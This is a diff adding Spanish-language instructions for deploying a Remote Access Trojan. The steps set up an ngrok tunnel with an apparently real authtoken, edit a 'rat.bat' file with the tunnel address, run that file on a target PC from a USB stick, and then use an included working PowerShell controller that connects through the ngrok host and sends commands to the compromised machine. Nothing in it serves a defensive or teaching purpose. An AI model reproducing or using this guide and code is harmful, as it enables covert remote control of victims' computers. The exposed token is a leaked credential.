@@ -1,0 +1,70 @@
+INSTRUCCIONES PARA INICIAR EL RAT (Troyano de Acceso Remoto):
+
+
+1. Insertar el Pendrive en el PC-Atacante.
+2. Abrir la terminal (CMD) en el PC-Atacante.
+3. Iniciar NGROK.
+4. Introducir el siguiente comando: ngrok authtoken 2fMTJwMIwkRwgYqEhi8APJHcrqz_4s4twExCuuZj6XhpFJrHh
+5. Abrir el puerto "4444" en el PC-Atacante mediante el siguiente comando: ngrok tcp 4444
+6. Editar el archivo "rat.bat" e introducir la IP y el Puerto que da NGROK al abrir el puerto.
+7. Guardar el archivo y retirar el Pendrive.
+
+8. Insertar el Pendrive en el PC-Objetivo.
+9. Abrir el explorador de archivos.
+10. Ejecutar el archivo malicioso "rat.bat".
+11. Retirar el Pendrive.
+
+12. Abrir PowerShell en el PC-Atacante.
+13. Ejecutar el siguiente comando en PowerShell:
+$NgrokHost = "2.tcp.eu.ngrok.io" 
+$NgrokPort = 21339             
+
+try {
+    Write-Host "[+] Intentando conectar con el objetivo..." -ForegroundColor Yellow
+    $client = New-Object System.Net.Sockets.TcpClient
+    $client.Connect($NgrokHost, $NgrokPort)
+    
+    $stream = $client.GetStream()
+    $writer = New-Object System.IO.StreamWriter($stream)
+    $reader = New-Object System.IO.StreamReader($stream)
+    
+    Write-Host "[+] ¡Conexión establecida! Estás dentro." -ForegroundColor Green
+    Write-Host "[+] Escribe 'exit' para desconectarte." -ForegroundColor Gray
+    
+    while ($true) {
+        $command = Read-Host "RAT> "
+        
+        if ($command -eq "exit") { 
+            $writer.WriteLine("EXIT")
+            $writer.Flush()
+            break 
+        }
+        
+        $writer.WriteLine($command)
+        $writer.Flush()
+        
+        $response = ""
+        try {
+            Start-Sleep -Milliseconds 500
+            
+            while ($reader.Peek() -ne -1) {
+                $response += $reader.ReadLine() + "`n"
+            }
+            
+            if ($response.Trim()) {
+                Write-Host "--- SALIDA ---" -ForegroundColor Cyan
+                Write-Host $response
+                Write-Host "-------------" -ForegroundColor Cyan
+            } else {
+                Write-Host "(Sin respuesta inmediata o comando completado)" -ForegroundColor DarkGray
+            }
+        } catch {
+            Write-Host "[!] Error leyendo respuesta: $_" -ForegroundColor Red
+        }
+    }
+    
+    $client.Close()
+    Write-Host "[+] Sesión cerrada." -ForegroundColor Yellow
+} catch {
+    Write-Host "[!] No se pudo conectar. Verifica que Ngrok está corriendo y que la IP/Puerto son correctos." -ForegroundColor Red
+}
